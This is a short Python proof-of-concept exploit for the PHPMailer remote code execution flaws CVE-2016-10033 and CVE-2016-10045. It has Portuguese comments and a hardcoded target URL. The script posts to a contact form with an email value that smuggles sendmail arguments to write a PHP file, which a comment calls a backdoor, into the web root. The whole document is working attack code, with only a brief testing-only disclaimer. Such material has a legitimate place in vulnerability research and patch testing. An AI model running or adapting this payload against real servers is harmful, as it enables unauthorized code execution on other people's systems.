#!/usr/bin/python

intro = """
PHPMailer RCE PoC Exploits

PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
+
PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
(the bypass of the first patch for CVE-2016-10033)

Discovered and Coded by:

 Dawid Golunski
 @dawid_golunski
 https://legalhackers.com

"""
usage = """
Usage:

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html

https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html

PoC Video:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html

Disclaimer:
For testing purposes only. Do no harm.

"""
import time
import urllib.request
import urllib.parse
import socket
import sys

RW_DIR = "/var/www/html/vendor"

url = 'http://172.30.0.125/contact.php'  # Defina o URL de destino aqui

# Escolha/descomente um dos payloads:

# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
# payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode.php  some"@email.com' % RW_DIR

# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
payload = '"attacker\\" -oQ/tmp/ -X%s/string.php  mal"@email.com' % RW_DIR

######################################

# Código PHP a ser salvo no arquivo PHP backdoor no alvo em RW_DIR
RCE_PHP_CODE = "<?php phpinfo(); ?>"

post_fields = {'action': 'send', 'name': 'Pentest', 'email': payload, 'subject': 'hacking', 'message': RCE_PHP_CODE}

# Ataque
data = urllib.parse.urlencode(post_fields).encode()
req = urllib.request.Request(url, data=data)
response = urllib.request.urlopen(req)
the_page = response.read()
